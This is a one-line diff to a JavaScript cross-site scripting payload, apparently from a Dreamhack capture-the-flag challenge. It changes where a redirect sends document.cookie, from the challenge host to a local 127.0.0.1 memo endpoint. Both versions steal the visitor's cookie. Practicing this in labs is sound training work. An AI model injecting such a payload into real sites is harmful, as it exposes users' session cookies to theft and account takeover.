@@ -1,1 +1,1 @@
-location.href="http://host8.dreamhack.games:15455/memo?memo="+document.cookie
+location.href = "http://127.0.0.1:8000/memo?memo="+document.cookie
